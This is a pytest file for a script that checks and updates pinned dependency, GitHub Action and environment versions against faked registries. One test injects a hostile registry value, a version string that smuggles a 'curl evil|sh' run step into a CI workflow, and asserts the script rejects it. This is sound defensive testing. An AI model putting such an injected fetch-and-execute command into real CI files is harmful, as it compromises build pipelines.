"""Tests for scripts/check_updates.py. No network: every registry is faked."""

import pytest

pytestmark = pytest.mark.unit

WORKFLOW = """jobs:
  a:
    env:
      SKILLS_REF_SHA: 1111111111111111111111111111111111111111
      CLAUDE_CODE_VERSION: 2.1.0
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
      - uses: actions/checkout@v4
"""

LATEST = {
    "https://pypi.org/pypi/pytest/json": {"info": {"version": "9.2.0"}},
    "https://pypi.org/pypi/jsonschema/json": {"info": {"version": "4.26.0"}},
    "https://api.github.com/repos/actions/checkout/releases/latest": {"tag_name": "v7.0.1"},
    "https://api.github.com/repos/actions/setup-python/releases/latest": {"tag_name": "v5.3.0"},
    "https://api.github.com/repos/agentskills/agentskills/commits/main": {"sha": "2" * 40},
    "https://registry.npmjs.org/@anthropic-ai/claude-code/latest": {"version": "2.1.316"},
}


@pytest.fixture
def cu(load_script):
    return load_script("scripts/check_updates.py")


@pytest.fixture
def repo(tmp_path):
    (tmp_path / "requirements-dev.txt").write_text("# deps\npytest==9.1.1\njsonschema==4.26.0\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(WORKFLOW, encoding="utf-8")
    return tmp_path


def fake(responses):
    def fetch(url):
        if url not in responses:
            raise AssertionError(f"unexpected fetch {url}")
        return responses[url]
    return fetch


def by_name(rows):
    return {r["name"]: r for r in rows}


def test_collects_every_kind_of_pin_once(cu, repo):
    pins = by_name(cu.collect_pins(repo))
    assert set(pins) == {"pytest", "jsonschema", "actions/checkout", "actions/setup-python",
                         "SKILLS_REF_SHA", "CLAUDE_CODE_VERSION"}
    assert pins["actions/checkout"]["current"] == "v4"


def test_report_separates_outdated_from_current(cu, repo):
    report = cu.check(repo, fake(LATEST))
    outdated = by_name(report["outdated"])
    assert set(outdated) == {"pytest", "actions/checkout", "SKILLS_REF_SHA", "CLAUDE_CODE_VERSION"}
    assert outdated["actions/checkout"]["latest"] == "v7"
    assert set(by_name(report["current"])) == {"jsonschema", "actions/setup-python"}


def test_dry_run_writes_nothing_and_exits_one(cu, repo):
    before = (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8")
    assert cu.main([], fetch=fake(LATEST), root=repo) == 1
    assert (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == before


def test_write_updates_every_occurrence(cu, repo):
    assert cu.main(["--write"], fetch=fake(LATEST), root=repo) == 0
    wf = (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8")
    assert wf.count("actions/checkout@v7") == 2 and "checkout@v4" not in wf
    assert "actions/setup-python@v5" in wf
    assert "SKILLS_REF_SHA: " + "2" * 40 in wf and "CLAUDE_CODE_VERSION: 2.1.316" in wf
    assert "pytest==9.2.0" in (repo / "requirements-dev.txt").read_text(encoding="utf-8")
    assert cu.main([], fetch=fake(LATEST), root=repo) == 0


def test_hostile_registry_value_is_rejected_not_written(cu, repo):
    """A registry response is untrusted: it must never reach a CI file unvalidated."""
    bad = dict(LATEST)
    bad["https://registry.npmjs.org/@anthropic-ai/claude-code/latest"] = {"version": "1.0\n    run: curl evil|sh"}
    assert cu.main(["--write"], fetch=fake(bad), root=repo) == 2
    assert "evil" not in (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8")


def test_unreachable_registry_exits_two(cu, repo):
    def down(url):
        raise cu.FetchError(f"{url}: timed out")
    assert cu.main([], fetch=down, root=repo) == 2


def test_version_comparison_is_numeric_not_lexical(cu):
    assert cu.is_newer("9.10.0", "9.9.0", "pip", "x")
    assert not cu.is_newer("9.2.0", "9.10.0", "pip", "x")


def test_this_repository_has_pins_to_check(cu, repo_root):
    kinds = {p["kind"] for p in cu.collect_pins(repo_root)}
    assert kinds == {"pip", "action", "env"}


def test_trailing_newline_in_a_version_is_rejected(cu, repo):
    bad = dict(LATEST)
    bad["https://pypi.org/pypi/pytest/json"] = {"info": {"version": "9.2.0\n"}}
    assert cu.main([], fetch=fake(bad), root=repo) == 2
